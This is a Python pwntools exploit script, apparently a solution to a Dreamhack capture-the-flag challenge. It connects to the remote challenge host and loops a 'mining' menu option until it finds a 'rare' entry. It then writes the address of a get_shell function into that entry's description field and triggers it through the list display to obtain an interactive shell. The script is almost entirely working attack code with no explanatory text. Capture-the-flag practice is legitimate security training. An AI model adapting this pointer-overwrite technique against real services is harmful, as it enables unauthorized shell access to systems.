#!/usr/bin/env python3

from pwn import *

#p = process("./main")
p = remote("host2.dreamhack.games", 22662)
get_shell = 0x402576

sla = lambda t, x: p.sendlineafter(t, x)
idx = 0
rare_idx = 0

def mining():
    global idx
    global rare_idx
    sla(">> ", str(1))
    p.recvline() # Throw [+] Mining...
    result = p.recvline().decode()
    if "undiscovered" in result:
        sla(": ", "dummy")
        idx += 1
        flag = False
    elif "rare" in result:
        rare_idx = idx
        flag = True
    else:
        flag = False
    return flag

def edit_description(num):
    sla(">> ", str(3))
    sla(": ", str(num))
    sla(": ", p64(get_shell))

def show_list():
    sla(">> ", str(2))

def main():
    while True:
        result = mining()
        if result:
            log.info(f"Your rare minerals index is {rare_idx}")
            break
    edit_description(rare_idx)
    show_list()
    p.interactive()

if __name__ == '__main__':
    main()
